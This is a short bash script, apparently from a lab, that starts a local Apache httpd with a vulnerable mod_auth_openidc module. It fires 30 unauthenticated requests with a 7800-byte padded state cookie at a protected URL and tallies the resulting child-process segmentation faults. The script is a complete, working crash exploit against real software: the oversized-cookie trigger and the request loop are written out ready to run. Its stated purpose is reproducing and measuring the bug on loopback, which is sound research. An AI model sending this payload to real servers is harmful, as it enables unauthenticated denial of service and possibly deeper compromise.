#!/usr/bin/env bash
# Frequency check: 30 unauthenticated bare 7800-byte state tokens, plain vulnerable
# module, normal multi-child daemon (no gdb, no forced execution). Loopback only.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/apache2shell/build/httpd-2.4.70-install/bin/httpd
CONF="$HERE/httpd-plain.conf"
ERR="$HERE/error-plain.log"
URL=http://127.0.0.1:18090/protected
OUT="$HERE/evidence/plain-crash"
export LD_LIBRARY_PATH="$HERE/plain-prefix/lib"
mkdir -p "$OUT"
stop() { "$HTTPD" -f "$CONF" -k stop >/dev/null 2>&1 || true; sleep 1; }
trap stop EXIT
stop
: >"$ERR"
"$HTTPD" -f "$CONF" -k start >"$OUT/freq-start.out" 2>&1
sleep 2
PAD=$(printf 'a%.0s' $(seq 1 7800))
: >"$OUT/freq-codes.txt"
for i in $(seq 1 30); do
  code=$(curl -sS --max-time 8 -o /dev/null -w '%{http_code}' \
    -H "Cookie: mod_auth_openidc_state_$PAD" "$URL" 2>/dev/null || echo CURLERR)
  echo "$i $code" >>"$OUT/freq-codes.txt"
done
cp "$ERR" "$OUT/freq-error.log"
printf 'trials=%s segv_children=%s empty=%s codes_302=%s\n' \
  "$(wc -l <"$OUT/freq-codes.txt")" \
  "$(grep -ci 'exit signal Segmentation fault' "$OUT/freq-error.log" || true)" \
  "$(grep -c '000\|CURLERR' "$OUT/freq-codes.txt" || true)" \
  "$(grep -c ' 302$' "$OUT/freq-codes.txt" || true)" >"$OUT/freq-summary.txt"
cat "$OUT/freq-summary.txt"
